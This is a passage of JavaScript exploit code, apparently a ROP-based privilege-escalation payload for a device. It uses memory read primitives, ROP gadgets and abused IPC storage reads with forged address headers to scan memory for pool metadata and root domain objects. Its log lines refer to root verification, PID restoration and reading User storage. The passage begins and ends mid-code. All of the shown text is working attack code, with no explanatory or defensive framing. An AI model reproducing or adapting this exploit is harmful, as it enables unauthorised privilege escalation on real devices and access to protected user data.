                          before: rootPid, beforeBytes: liveBaseline.slice()},
                      {name: "nca", object: backendResults[0].address,
                          objectSize: 0x60, pidOffset: 0x20,
                          before: backendResults[0].pid,
                          beforeBytes: backendResults[0].bytes.slice()},
                      {name: "save", object: backendResults[1].address,
                          objectSize: 0x60, pidOffset: 0x28,
                          before: backendResults[1].pid,
                          beforeBytes: backendResults[1].bytes.slice()}
                  ]
              };
          }
          await log("ROOT: result=" + (verified ? "VERIFIED" :
              "NOT VERIFIED") + " pid=0x" + rootPid.toString(16) +
              " domainId=" + domainId + " backends=" +
              backendResults.map(function(item) {
                  return item.name + ":" +
                      (item.pid !== undefined ? "pid=0x" +
                          item.pid.toString(16) : "pid=unread") +
                      "/objectRead=" + !!item.read + "/links=" +
                      !!item.linksOk +
                      "/vptrShape=" + !!item.vptrShapeOk + "/stable=" +
                      !!item.stable;
              }).join(","));
          return lookupResult(verified);
      } finally {
          if (cloneHandles.length) {
              for (var leftIndex = cloneHandles.length - 1;
                  leftIndex >= 0; leftIndex--) {
                  var retryClose = Number(closeHandle(
                      cloneHandles[leftIndex])) >>> 0;
                  if (retryClose !== 0) {
                      await log("ROOT: retry clone close failed=" +
                          hex32(retryClose));
                  }
              }
              cloneHandles = [];
          }
          if (domainSession && verified) {
              await log("ROOT: retaining the verified domain session " +
                  "through PID restoration and the final User-storage read");
          } else if (domainSession) {
              var domainClose = Number(closeHandle(domainSession.handle)) >>> 0;
              await log("ROOT: close inspected domain session rc=" +
                  hex32(domainClose));
              domainSession = null;
          }
      }
  }

  function scanNativeLinkBuffer(input) {
      const config = input.config;
      const buffer = input.buffer;
      const bufferOffset = input.bufferOffset;
      const length = input.length;
      const sourceAddress = input.sourceAddress;
      const seed = input.seed;
      const links = input.links.slice();
      const seen = {...input.seen};
      var firstOffset = (config.CONTROL_SIZE - sourceAddress % config.CONTROL_SIZE) %
          config.CONTROL_SIZE;
      for (var offset = firstOffset; offset + 64 <= length;
          offset += config.CONTROL_SIZE) {
          var valueBig = read64(buffer + BigInt(bufferOffset + offset));
          if (valueBig <= 0x100000000n || valueBig >= 0x8000000000n ||
              valueBig % BigInt(config.CONTROL_SIZE) !== 0n) continue;
          var value = Number(valueBig);
          if (!Number.isSafeInteger(value) || Math.abs(value - seed) >= 0x2000000)
              continue;
          var zeroTail = true;
          for (var tail = 8; tail < 64; tail += 8) {
              if (read64(buffer + BigInt(bufferOffset + offset + tail)) !== 0n) {
                  zeroTail = false;
                  break;
              }
          }
          var source = sourceAddress + offset;
          var key = source.toString(16) + ":" + value.toString(16);
          if (seen[key]) continue;
          seen[key] = true;
          links.push({source: source, value: value, zeroTail: zeroTail});
      }
      return {links, seen};
  }

  async function reportMetadataProgress(input, message) {
      if (typeof input.reportProgress === "function")
          await input.reportProgress(message);
      else
          await log(message);
  }

  async function resolvePoolCandidates(seed, sourceLinks, outputBuf, label, input) {
      const config = input.config;
      let addressPlan = input.addressPlan;
      let candidateHandle = input.candidateHandle;
      // The payload reserves live progress logs for external-link checks;
      // callers without a progress callback retain the detailed scan logs.
      var links = sourceLinks.slice();
      var captures = [{address: seed, length: 0x500000}];
      var seen = {};
      for (var si = 0; si < links.length; si++)
          seen[links[si].source.toString(16) + ":" +
              links[si].value.toString(16)] = true;

      for (var refinement = 0;
          refinement <= config.MAX_POOL_REFINEMENT_READS; refinement++) {
          var bounds = RootLayout.derivePoolBounds(links, seed, {controlSize: config.CONTROL_SIZE});
          if (!bounds.candidates.length) {
              if (!input.reportProgress)
                  await reportMetadataProgress(input, "METADATA " + label +
                      ": no pool hypothesis fits " + links.length +
                      " native links");
              return {ok: true, candidates: [], links: links.length,
                  refinementReads: refinement};
          }
          if (bounds.candidates.length <= config.MAX_POOL_ANCHOR_CANDIDATES) {
              // The payload reports the combined scan result after the
              // external-link checks. Keep this detail for legacy log callers.
              if (!input.reportProgress)
                  await reportMetadataProgress(input, "METADATA " + label +
                      ": pool bounds resolved " + bounds.candidates.length +
                      " candidate(s), links=" + links.length +
                      " refinements=" + refinement);
              return {ok: true, candidates: bounds.candidates,
                  links: links.length, refinementReads: refinement};
          }
          if (refinement === config.MAX_POOL_REFINEMENT_READS) {
              if (!input.reportProgress)
                  await reportMetadataProgress(input, "METADATA " + label +
                      ": pool bounds remain ambiguous after " + refinement +
                      " refinement reads (" + bounds.candidates.length +
                      " candidates); checking their external-link locations " +
                      "within the remaining budget");
              return {ok: true, candidates: bounds.candidates, unresolved: true,
                  links: links.length, refinementReads: refinement};
          }

          var readStart = RootLayout.choosePoolRefinementStart(bounds, links, captures,
              addressPlan.addressBias, config.ROOT_CAPTURE_CHUNK, refinement,
              {controlSize: config.CONTROL_SIZE, maxPoolCandidates: config.MAX_POOL_ANCHOR_CANDIDATES});
          if (readStart === null) {
              if (!input.reportProgress)
                  await reportMetadataProgress(input, "METADATA " + label +
                      ": no uncovered bucket lies inside all pool hypotheses; " +
                      "checking " + bounds.candidates.length +
                      " candidate external-link locations");
              return {ok: true, candidates: bounds.candidates, unresolved: true,
                  links: links.length, refinementReads: refinement};
          }
          var chunkWindow = {start: readStart,
              end: readStart + config.ROOT_CAPTURE_CHUNK};
          var chunkRead = await readFsAddressBytes({config, addressPlan,
              candidateHandle, address: readStart,
              length: config.ROOT_CAPTURE_CHUNK, outputBuf,
              allowedWindow: chunkWindow, materializeBytes: false});
          if (!chunkRead.ok) return {ok: false,
              continueSeed: !chunkRead.fatal, error: chunkRead.error};
          var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
              bufferOffset: chunkRead.bufferOffset,
              length: config.ROOT_CAPTURE_CHUNK, sourceAddress: readStart,
              seed, links, seen, config});
          links = scannedLinks.links;
          seen = scannedLinks.seen;
          captures.push({address: readStart, length: config.ROOT_CAPTURE_CHUNK});
          if (!input.reportProgress) {
              await reportMetadataProgress(input, "METADATA " + label +
                  ": pool refinement " + (refinement + 1) + "/" +
                  config.MAX_POOL_REFINEMENT_READS + " links=" + links.length +
                  " candidates=" + RootLayout.derivePoolBounds(links, seed,
                      {controlSize: config.CONTROL_SIZE}).candidates.length);
          }
      }
      var finalBounds = RootLayout.derivePoolBounds(links, seed,
          {controlSize: config.CONTROL_SIZE});
      return {ok: true, candidates: finalBounds.candidates, unresolved: true,
          links: links.length, refinementReads: config.MAX_POOL_REFINEMENT_READS};
  }

  async function discoverMetadataAnchors(seedPlan, label, input) {
      const withStepData = (result) => ({...result, metadataAnchorChecks, addressPlan});
      const config = input.config;
      let addressPlan = input.addressPlan;
      let candidateHandle = input.candidateHandle;
      let metadataAnchorChecks = input.metadataAnchorChecks;
      addressPlan = seedPlan;
      if (metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS)
          return withStepData({ok: true, anchors: [], continueSeed: false,
              capReached: true});
      var seed = Number(seedPlan.target);
      var sourceLength = 0x500000;
      var sourceEnd = seed + sourceLength;
      if (!Number.isSafeInteger(seed) || !Number.isSafeInteger(sourceEnd) ||
          seed % config.CONTROL_SIZE !== 0 || sourceEnd >= 0x8000000000) {
          return withStepData({ok: false, continueSeed: true,
              error: "seed capture bounds are not canonical/aligned"});
      }

      if (!input.reportProgress)
          await reportMetadataProgress(input, "METADATA " + label +
              ": reading seed window [0x" + seed.toString(16) + ",0x" +
              sourceEnd.toString(16) + ") bytes=0x500000 chunks=32");
      var captureBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
      if (!captureBuf) return withStepData({ok: false, continueSeed: false,
          error: "seed capture buffer allocation failed"});
      var links = [];
      var seen = {};
      var sourceWindow = {start: seed, end: sourceEnd};
      for (var chunkIndex = 0; chunkIndex < 0x500000 / config.ROOT_CAPTURE_CHUNK;
          chunkIndex++) {
          var chunkAddress = seed + chunkIndex * config.ROOT_CAPTURE_CHUNK;
          var chunkRead = await readFsAddressBytes({config, addressPlan,
              candidateHandle, address: chunkAddress,
              length: config.ROOT_CAPTURE_CHUNK, outputBuf: captureBuf,
              allowedWindow: sourceWindow, materializeBytes: false});
          if (!chunkRead.ok) return withStepData({ok: false,
              continueSeed: !chunkRead.fatal, error: "seed chunk " +
                  chunkIndex + ": " + chunkRead.error});
          var scannedLinks = scanNativeLinkBuffer({buffer: chunkRead.buffer,
              bufferOffset: chunkRead.bufferOffset,
              length: config.ROOT_CAPTURE_CHUNK, sourceAddress: chunkAddress,
              seed, links, seen, config});
          links = scannedLinks.links;
          seen = scannedLinks.seen;
          if (!input.reportProgress && (chunkIndex + 1) % 8 === 0 &&
              chunkIndex + 1 < 0x500000 / config.ROOT_CAPTURE_CHUNK) {
              await reportMetadataProgress(input, "METADATA " + label + ": seed progress=" +
                  (chunkIndex + 1) + "/32 links=" + links.length);
          }
      }
      if (!input.reportProgress)
          await reportMetadataProgress(input, "METADATA " + label +
              ": seed capture complete; native links=" + links.length);
      if (!links.length) return withStepData({ok: true, anchors: [],
          continueSeed: true, poolCandidates: 0, externalLinkChecks: 0});

      var poolResult = await resolvePoolCandidates(seed, links, captureBuf,
          label, {config, addressPlan, candidateHandle,
              reportProgress: input.reportProgress});
      if (!poolResult.ok) return withStepData({ok: false,
          continueSeed: poolResult.continueSeed, error: poolResult.error});
      if (!poolResult.candidates.length) {
          await log("METADATA " + label +
              ": no pool hypotheses remain; external-link checks=0");
          return withStepData({ok: true, anchors: [], continueSeed: true,
              unresolved: Boolean(poolResult.unresolved), poolCandidates: 0,
              nativeLinks: poolResult.links,
              refinementReads: poolResult.refinementReads,
              externalLinkChecks: 0, poolCandidatesVisited: 0});
      }

      var anchors = [];
      var anchorSeen = {};
      var externalLinkChecks = 0;
      var poolCandidatesVisited = 0;
      for (var poolIndex = 0;
          poolIndex < poolResult.candidates.length &&
              metadataAnchorChecks < config.MAX_METADATA_ANCHOR_CHECKS; poolIndex++) {
          poolCandidatesVisited = poolIndex + 1;
          var poolStart = poolResult.candidates[poolIndex];
          var anchorAddress = poolStart + 0x3a00000;
          if (!Number.isSafeInteger(anchorAddress) ||
              anchorAddress < 0x100000000 || anchorAddress >= 0x8000000000) {
              await log("METADATA " + label + ": pool candidate " +
                  (poolIndex + 1) + " has a non-canonical external-link address");
              continue;
          }
          var alignedStart = seedPlan.addressBias + Math.floor(
              (anchorAddress - seedPlan.addressBias) / config.ROOT_CAPTURE_CHUNK) *
              config.ROOT_CAPTURE_CHUNK;
          var anchorOffset = anchorAddress - alignedStart;
          var anchorLength = anchorOffset + 0x1000;
          var anchorWindow = {start: alignedStart,
              end: alignedStart + anchorLength};
          metadataAnchorChecks++;
          externalLinkChecks++;
          await reportMetadataProgress(input, "METADATA " + label +
              ": checking external-link candidate " + (poolIndex + 1) + "/" +
              poolResult.candidates.length + " (check " + externalLinkChecks +
              "/" + config.MAX_METADATA_ANCHOR_CHECKS + ")");
          var linkReadA = await readFsAddressBytes({config, addressPlan,
              candidateHandle, address: alignedStart, length: anchorLength,
              outputBuf: captureBuf, allowedWindow: anchorWindow});
          if (!linkReadA.ok) {
              await log("METADATA " + label + ": external-link " +
                  (poolIndex + 1) + " read rejected: " + linkReadA.error);
              if (linkReadA.fatal) {
                  if (anchors.length > 0) {
                      await log("METADATA " + label +
                          ": preserving " + anchors.length +
                          " earlier valid anchor(s) after read error");
                      return withStepData({ok: true, anchors: anchors, continueSeed: false,
                          stopAfterAnchors: true, error: linkReadA.error});
                  }
                  return withStepData({ok: false, continueSeed: false,
                      error: linkReadA.error});
              }
              continue;
          }
          var linkReadB = await readFsAddressBytes({config, addressPlan,
              candidateHandle, address: alignedStart, length: anchorLength,
              outputBuf: captureBuf, allowedWindow: anchorWindow});
          if (!linkReadB.ok) {
              await log("METADATA " + label + ": external-link " +
                  (poolIndex + 1) + " repeat rejected: " + linkReadB.error);
              if (linkReadB.fatal) {
                  if (anchors.length > 0) {
                      await log("METADATA " + label +
                          ": preserving " + anchors.length +
                          " earlier valid anchor(s) after repeat-read error");
                      return withStepData({ok: true, anchors: anchors, continueSeed: false,
                          stopAfterAnchors: true, error: linkReadB.error});
                  }
                  return withStepData({ok: false, continueSeed: false,
                      error: linkReadB.error});
              }
              continue;
          }
          var nextA = AnalysisBytes.readU64LE(linkReadA.bytes, anchorOffset);
          var previousA = AnalysisBytes.readU64LE(linkReadA.bytes,
              anchorOffset + 8);
          var extentA = AnalysisBytes.readU64LE(linkReadA.bytes,
              anchorOffset + 16);
          var nextB = AnalysisBytes.readU64LE(linkReadB.bytes, anchorOffset);
          var previousB = AnalysisBytes.readU64LE(linkReadB.bytes,
              anchorOffset + 8);
          var extentB = AnalysisBytes.readU64LE(linkReadB.bytes,
              anchorOffset + 16);
          var stableNext = nextA === nextB;
          var stablePrevious = previousA === previousB;
          var stableExtent = extentA === extentB;
          var stableLink = stableNext && stablePrevious && stableExtent;
          var nextShapeOk = nextA >= 0x100000000n &&
              nextA < 0x8000000000n && nextA % 8n === 0n;
          var reciprocalOk = nextA === previousA;
          var linkDistance = nextA >= BigInt(anchorAddress)
              ? nextA - BigInt(anchorAddress)
              : BigInt(anchorAddress) - nextA;
          var distanceOk = linkDistance > 0x8000000n;
          var extentShapeOk = extentA >= 0x10000n &&
              extentA <= 0x10000000n && extentA % 0x1000n === 0n;
          var externalLink = stableLink
              ? RootLayout.parseExternalLink(linkReadA.bytes, anchorOffset,
                  anchorAddress)
              : null;
          if (!externalLink) {
              var rejectionReasons = [];
              if (!stableLink) rejectionReasons.push("fields-unstable");
              if (!nextShapeOk) rejectionReasons.push("next-shape");
              if (!reciprocalOk) rejectionReasons.push("not-reciprocal");
              if (!distanceOk) rejectionReasons.push("next-distance");
              if (!extentShapeOk) rejectionReasons.push("extent-shape");
              if (!rejectionReasons.length) rejectionReasons.push("parser-rejected");
              await log("METADATA " + label + ": external-link " +
                  (poolIndex + 1) + "/" + poolResult.candidates.length +
                  " rejected reasons=" + rejectionReasons.join(",") +
                  " stable(next/previous/extent)=" + stableNext + "/" +
                  stablePrevious + "/" + stableExtent +
                  " reciprocal=" + reciprocalOk + " distance=" + distanceOk +
                  " extent=" + extentShapeOk);
              continue;
          }
          var metadataWindow = RootLayout.metadataWindowFromNext(externalLink.next);
          if (!metadataWindow || metadataWindow.anchorOffset + 16 >
              metadataWindow.length) {
              await log("METADATA " + label + ": next pointer did not " +
                  "produce a bounded metadata page");
              continue;
          }
          var anchorKey = metadataWindow.address.toString(16) + ":" +
              anchorAddress.toString(16);
          if (anchorSeen[anchorKey]) continue;
          anchorSeen[anchorKey] = true;
          anchors.push({poolStart: poolStart, nodeAddress: anchorAddress,
              next: Number(externalLink.next), extent: Number(externalLink.extent),
              window: metadataWindow});
          await log("METADATA " + label + ": external-link " +
              (poolIndex + 1) + "/" + poolResult.candidates.length +
              " valid node=0x" + anchorAddress.toString(16) +
              " next=0x" + externalLink.next.toString(16) +
              " extent=0x" + externalLink.extent.toString(16) +
              " page=0x" + metadataWindow.address.toString(16) +
              " probe=0x" + metadataWindow.length.toString(16));
      }
      var anchorsRemaining = poolCandidatesVisited < poolResult.candidates.length;
      await log("METADATA " + label + ": external-link checks=" +
          externalLinkChecks + "/" + poolResult.candidates.length +
          " candidates-visited=" + poolCandidatesVisited +
          " valid-anchors=" + anchors.length + " global-checks=" +
          metadataAnchorChecks + "/" + config.MAX_METADATA_ANCHOR_CHECKS);
      return withStepData({ok: true, anchors: anchors,
          continueSeed: anchors.length === 0,
          capReached: anchorsRemaining &&
              metadataAnchorChecks >= config.MAX_METADATA_ANCHOR_CHECKS,
          unresolved: Boolean(poolResult.unresolved),
          poolCandidates: poolResult.candidates.length,
          poolCandidatesVisited,
          externalLinkChecks,
          nativeLinks: poolResult.links,
          refinementReads: poolResult.refinementReads});
  }

  async function qualifyMetadataPage(anchor, label, pointerTargets, input) {
      const withStepData = (result) => ({...result, addressPlan, addressCopy});
      const config = input.config;
      let addressPlan = input.addressPlan;
      let metadataPageProbes = input.metadataPageProbes;
      let storageHandle = input.storageHandle;
      let candidateHandle = input.candidateHandle;
      let savedHandle = input.savedHandle;
      let addressCopy = input.addressCopy;
      var page = anchor.window.address;
      var plan;
      try {
          var alignedTargets = pointerTargets.slice();
          alignedTargets.push(Math.floor(page / config.CONTROL_SIZE) * config.CONTROL_SIZE);
          plan = CachePlan.buildLowerWindowPlan(page, addressPlan.storageSize,
              config.ROOT_CAPTURE_CHUNK, alignedTargets);
      } catch (planError) {
          await log("METADATA " + label + ": page plan rejected (" +
              planError.message + ")");
          return withStepData({ok: false, continueScan: true});
      }
      var encoding = checkAddressHeaderEncoding(plan.bytes, {savedHandle});
      if (!encoding.ok) {
          await log("METADATA " + label +
              ": page header encoding rejected");
          return withStepData({ok: false, continueScan: true});
      }
      var window = anchor.window;
      if (window.anchorOffset < 0 || window.anchorOffset + 16 > window.length ||
          page < 0x100000000 || page + window.length >= 0x8000000000) {
          await log("METADATA " + label +
              ": page probe bounds rejected");
          return withStepData({ok: false, continueScan: true});
      }
      var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
      var pageBufA = allocPage(config.CONTROL_SIZE + 0x2000);
      var pageBufB = allocPage(config.CONTROL_SIZE + 0x2000);
      if (!ordinaryBuf || !pageBufA || !pageBufB)
          return withStepData({ok: false, continueScan: false,
              error: "metadata page buffer allocation failed"});
      call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(window.length));
      var ordinaryRead = ipcStorageRead(storageHandle, plan.readOffset,
          window.length, ordinaryBuf);
      if (ordinaryRead.error !== 0) return withStepData({ok: false,
          continueScan: false, error: "ordinary metadata control=" +
              hex32(ordinaryRead.error)});
      if (!hasByteDifferent(ordinaryBuf, window.length, 0xA5))
          return withStepData({ok: false, continueScan: false,
              error: "ordinary metadata control remained poison"});

      var headerCopy = await installAddressHeader({...addressCopy,
          desiredBytes: plan.bytes,
          stageName: "cache-metadata-page-" + metadataPageProbes});
      addressCopy = headerCopy.addressCopy;
      if (!headerCopy.ok) {
          return withStepData({ok: false, continueScan: false,
              error: "metadata page header copy failed"});
      }
      addressPlan = plan;
      var pageWindow = {start: page, end: page + window.length};
      var pageReadA = await readFsAddressBytes({config, addressPlan,
          candidateHandle, address: page, length: window.length,
          outputBuf: pageBufA, allowedWindow: pageWindow});
      if (!pageReadA.ok) return withStepData({ok: false,
          continueScan: !pageReadA.fatal, error: pageReadA.error});
      var pageReadB = await readFsAddressBytes({config, addressPlan,
          candidateHandle, address: page, length: window.length,
          outputBuf: pageBufB, allowedWindow: pageWindow});
      if (!pageReadB.ok) return withStepData({ok: false,
          continueScan: !pageReadB.fatal, error: pageReadB.error});
      var expectedNode = BigInt(anchor.nodeAddress);
      var firstA = AnalysisBytes.readU64LE(pageReadA.bytes, window.anchorOffset);
      var previousA = AnalysisBytes.readU64LE(pageReadA.bytes,
          window.anchorOffset + 8);
      var firstB = AnalysisBytes.readU64LE(pageReadB.bytes, window.anchorOffset);
      var previousB = AnalysisBytes.readU64LE(pageReadB.bytes,
          window.anchorOffset + 8);
      var stableAnchor = firstA === firstB && previousA === previousB;
      var reciprocalAnchor = firstA === expectedNode &&
          previousA === expectedNode && firstB === expectedNode &&
          previousB === expectedNode;
      var ordinaryFirst = read64(ordinaryBuf + BigInt(window.anchorOffset));
      var ordinaryPrevious = read64(ordinaryBuf +
          BigInt(window.anchorOffset + 8));
      var ordinaryAnchorDiffers = ordinaryFirst !== expectedNode ||
          ordinaryPrevious !== expectedNode;
      var verified = stableAnchor && reciprocalAnchor && ordinaryAnchorDiffers;
      await log("METADATA " + label + ": page guard=" +
          (verified ? "PASS" : "FAIL") + " stable-anchor=" + stableAnchor +
          " reciprocal=" + reciprocalAnchor + " ordinary-anchor-differs=" +
          ordinaryAnchorDiffers + " page=0x" + page.toString(16) +
          " anchorOffset=0x" + window.anchorOffset.toString(16));
      return withStepData({ok: verified, continueScan: true, plan: plan,
          page: page, window: window});
  }

  async function verifyAddressCandidate(plan, label, index, input) {
      const withStepData = (result) => ({...result, addressPlan, addressCopy});
      const config = input.config;
      let addressPlan = input.addressPlan;
      let candidateHandle = input.candidateHandle;
      let storageHandle = input.storageHandle;
      let addressCopy = input.addressCopy;
      addressPlan = plan;
      var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
      if (!ordinaryBuf) {
          await log("ADDRESS " + label + ": ordinary buffer allocation failed");
          return withStepData({verified: false, continueScan: false});
      }
      call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
      var ordinaryReply = ipcStorageRead(storageHandle, plan.readOffset,
          config.CONTROL_SIZE, ordinaryBuf);
      if (ordinaryReply.error !== 0) {
          await log("ADDRESS " + label + ": ordinary control failed=" +
              hex32(ordinaryReply.error));
          return withStepData({verified: false, continueScan: false});
      }

      var headerCopy = await installAddressHeader({...addressCopy,
          desiredBytes: plan.bytes, stageName: "cache-address-" + index});
      addressCopy = headerCopy.addressCopy;
      if (!headerCopy.ok) {
          await log("ADDRESS " + label +
              ": header copy failed; stopping candidate scan");
          return withStepData({verified: false, continueScan: false});
      }

      var addressBufA = allocPage(config.CONTROL_SIZE + 0x2000);
      var addressBufB = allocPage(config.CONTROL_SIZE + 0x2000);
      if (!addressBufA || !addressBufB) {
          await log("ADDRESS " + label + ": output buffer allocation failed");
          return withStepData({verified: false, continueScan: false});
      }
      call_rop(GADGET_MEMSET, addressBufA, 0xA5n, BigInt(config.CONTROL_SIZE));
      call_rop(GADGET_MEMSET, addressBufB, 0x5An, BigInt(config.CONTROL_SIZE));

      var readA = ipcStorageRead(candidateHandle, plan.readOffset,
          config.CONTROL_SIZE, addressBufA);
      var readB = ipcStorageRead(candidateHandle, plan.readOffset,
          config.CONTROL_SIZE, addressBufB);
      var stable = readA.error === 0 && readB.error === 0 &&
          buffersEqual(addressBufA, addressBufB, config.CONTROL_SIZE);
      var differsFromControl = readA.error === 0 &&
          !buffersEqual(addressBufA, ordinaryBuf, config.CONTROL_SIZE);
      var changedFromPoison = readA.error === 0 &&
          hasByteDifferent(addressBufA, config.CONTROL_SIZE, 0xA5);
      var linkHead = readA.error === 0 ? read64(addressBufA) : 0n;
      var linkHeadShape = linkHead === 0n ||
          (linkHead >= 0x100000000n && linkHead < 0x8000000000n &&
              linkHead % 0x4000n === 0n);
      var verified = stable && differsFromControl && changedFromPoison &&
          linkHeadShape;
      var first16 = readA.error === 0
          ? readHexBytes(addressBufA, 16) : "unread";

      await log("ADDRESS " + label + ": " +
          (verified ? "ACCEPTED" : "rejected") +
          " read=" + hex32(readA.error) + "/" + hex32(readB.error) +
          " stable=" + stable + " differs=" + differsFromControl +
          " nonPoison=" + changedFromPoison + " headShape=" + linkHeadShape +
          " head=0x" + linkHead.toString(16) + " first16=" + first16);
      return withStepData({verified: verified,
          continueScan: readA.error === 0 && readB.error === 0});
  }

  function scanRootDomainChunk(input) {
      const config = input.config;
      const buffer = input.buffer;
      const chunkAddress = input.chunkAddress;
      const carry = input.carry;
      const candidates = input.candidates.slice();
      const seen = {...input.seen};
      for (var offset = 0; offset + 0x20 <= config.ROOT_CAPTURE_CHUNK;
          offset += 8) {
          var candidateAddress = chunkAddress + offset;
          var candidateFirst = read64(buffer + BigInt(offset));
          var candidateSecond = read64(buffer + BigInt(offset + 8));
          var candidateManager = read64(buffer + BigInt(offset + 0x18));
          var candidate = recordRootDomainCandidate(candidateAddress,
              candidateFirst, candidateSecond, candidateManager);
          if (candidate) {
              var key = candidate.address.toString(16) + ":" +
                  candidate.rootVptr.toString(16) + ":" +
                  candidate.manager.toString(16);
              if (!seen[key]) { seen[key] = true; candidates.push(candidate); }
          }
      }

      if (carry && carry.bytes.length === 0x18) {
          var boundary = carry.bytes.slice();
          for (var byteIndex = 0; byteIndex < 0x18; byteIndex++)
              boundary.push(Number(read8(buffer + BigInt(byteIndex))));
          for (var boundaryOffset = 0; boundaryOffset < 0x18;
              boundaryOffset += 8) {
              var boundaryAddress = carry.address + boundaryOffset;
              var boundaryFirst = AnalysisBytes.readU64LE(boundary, boundaryOffset);
              var boundarySecond = AnalysisBytes.readU64LE(boundary,
                  boundaryOffset + 8);
              var boundaryManager = AnalysisBytes.readU64LE(boundary,
                  boundaryOffset + 0x18);
              var boundaryCandidate = recordRootDomainCandidate(boundaryAddress,
                  boundaryFirst, boundarySecond, boundaryManager);
              if (boundaryCandidate) {
                  var boundaryKey = boundaryCandidate.address.toString(16) + ":" +
                      boundaryCandidate.rootVptr.toString(16) + ":" +
                      boundaryCandidate.manager.toString(16);
                  if (!seen[boundaryKey]) {
                      seen[boundaryKey] = true;
                      candidates.push(boundaryCandidate);
                  }
              }
          }
      }
      return {candidates, seen};
  }

  function scanRootDomainChunkPrefiltered(input) {
      const config = input.config;
      const buffer = input.buffer;
      const chunkAddress = input.chunkAddress;
      const carry = input.carry;
      const candidates = input.candidates.slice();
      const seen = {...input.seen};
      var offsetAddress = 0n;
      for (var offset = 0; offset + 0x20 <= config.ROOT_CAPTURE_CHUNK;
          offset += 8, offsetAddress += 8n) {
          var candidateAddress = chunkAddress + offset;
          var candidatePointer = buffer + offsetAddress;

          // The owner layout has stricter guards than a domain wrapper. Fold
          // its scan into this aligned pass so we do not walk every word a
          // second time. Owner starts are a subset of the wrapper scan range.
          if (offset + 0x78 <= config.ROOT_CAPTURE_CHUNK &&
              read64(candidatePointer + 0x20n) === input.retainedOwnerSize &&
              read64(candidatePointer + 0x28n) === 0x4000n &&
              read64(candidatePointer + 0x50n) === 0x5A0n &&
              Number(read32(candidatePointer + 0x58n)) === 10 &&
              read64(candidatePointer + 0x60n) === 14n) {
              input.rememberRetainedOwner(candidateAddress,
                  input.copyNativeBytes(candidatePointer, 0x78), 0);
          }

          var candidateFirst = read64(candidatePointer);
          var candidateSecond = undefined; // Fresh value for this slot.
          // A domain candidate must have a canonical first word. Fetch the
          // second word only for that necessary condition or a cache-array
          // header match, which keeps both searches complete.
          if (input.scanRetainedArrays && offset + 0x5A0 <=
                  config.ROOT_CAPTURE_CHUNK &&
              candidateFirst === input.retainedHeader0) {
              candidateSecond = read64(candidatePointer + 8n);
              if (candidateSecond === input.retainedHeader1 &&
                  Number(read8(candidatePointer + 0x10n)) === 0 &&
                  read64(candidatePointer + 0x18n) === 0n &&
                  read64(candidatePointer + 0x20n) === 0n &&
                  read64(candidatePointer + 0x28n) === 0n) {
                  input.rememberRetainedArray(candidateAddress,
                      input.copyNativeBytes(candidatePointer, 0x5A0), 0);
              }
          }
          if (candidateFirst < 0x28E0n ||
              !RootLayout.isCanonicalPointer(candidateFirst)) continue;
          if (candidateSecond === undefined)
              candidateSecond = read64(candidatePointer + 8n);
          if (candidateSecond - candidateFirst !== 0x58n) continue;
          var vptrPairRoot = candidateFirst - 0x28E0n;
          if (!RootLayout.isCanonicalPointer(candidateSecond) ||
              !RootLayout.isCanonicalPointer(vptrPairRoot) ||
              vptrPairRoot + 0x5880n >= 0x8000000000n) continue;
          var candidateManager = read64(candidatePointer + 0x18n);
          var candidate = recordRootDomainCandidate(candidateAddress,
              candidateFirst, candidateSecond, candidateManager);
          if (candidate) {
              var key = candidate.address.toString(16) + ":" +
                  candidate.rootVptr.toString(16) + ":" +
                  candidate.manager.toString(16);
              if (!seen[key]) { seen[key] = true; candidates.push(candidate); }
          }
      }

      if (carry && carry.bytes.length === 0x18) {
          var boundary = carry.bytes.concat(
              input.copyNativeBytes(buffer, 0x18));
          for (var boundaryOffset = 0; boundaryOffset < 0x18;
              boundaryOffset += 8) {
              var boundaryAddress = carry.address + boundaryOffset;
              var boundaryFirst = AnalysisBytes.readU64LE(boundary, boundaryOffset);
              var boundarySecond = AnalysisBytes.readU64LE(boundary,
                  boundaryOffset + 8);
              if (boundarySecond - boundaryFirst !== 0x58n ||
                  boundaryFirst < 0x28E0n) continue;
              var boundaryRootVptr = boundaryFirst - 0x28E0n;
              if (!RootLayout.isCanonicalPointer(boundaryFirst) ||
                  !RootLayout.isCanonicalPointer(boundarySecond) ||
                  !RootLayout.isCanonicalPointer(boundaryRootVptr) ||
                  boundaryRootVptr + 0x5880n >= 0x8000000000n) continue;
              var boundaryManager = AnalysisBytes.readU64LE(boundary,
                  boundaryOffset + 0x18);
              var boundaryCandidate = recordRootDomainCandidate(boundaryAddress,
                  boundaryFirst, boundarySecond, boundaryManager);
              if (boundaryCandidate) {
                  var boundaryKey = boundaryCandidate.address.toString(16) + ":" +
                      boundaryCandidate.rootVptr.toString(16) + ":" +
                      boundaryCandidate.manager.toString(16);
                  if (!seen[boundaryKey]) {
                      seen[boundaryKey] = true;
                      candidates.push(boundaryCandidate);
                  }
              }
          }
      }
      return {candidates, seen};
  }

  function captureDomainTail(input) {
      const config = input.config;
      const buffer = input.buffer;
      const chunkAddress = input.chunkAddress;
      var bytes = input.copyNativeBytes(
          buffer + BigInt(config.ROOT_CAPTURE_CHUNK - 0x18), 0x18);
      return {address: chunkAddress + config.ROOT_CAPTURE_CHUNK - 0x18,
          bytes: bytes};
  }

  function recordRootDomainCandidate(address, first, second, manager) {
      var candidate = RootLayout.makeDomainCandidate(address, first, second,
          manager, {domainVptrDelta: 0x58n, rootVptrDelta: 0x28E0n});
      if (!candidate || BigInt(candidate.rootVptr) + 0x5880n >= 0x8000000000n)
          return null;
      return candidate;
  }

  function readFsAddressBytes(input) {
      const config = input.config;
      let addressPlan = input.addressPlan;
      let candidateHandle = input.candidateHandle;
      let address = input.address;
      let length = input.length;
      let outputBuf = input.outputBuf;
      let allowedWindow = input.allowedWindow;
      let materializeBytes = input.materializeBytes;
      if (allowedWindow &&
          (!Number.isSafeInteger(allowedWindow.start) ||
              !Number.isSafeInteger(allowedWindow.end) ||
              allowedWindow.end <= allowedWindow.start))
          return {ok: false, error: "explicit address window is invalid"};
      var allowedStart = allowedWindow
          ? allowedWindow.start
          : (addressPlan && addressPlan.lowerWindow
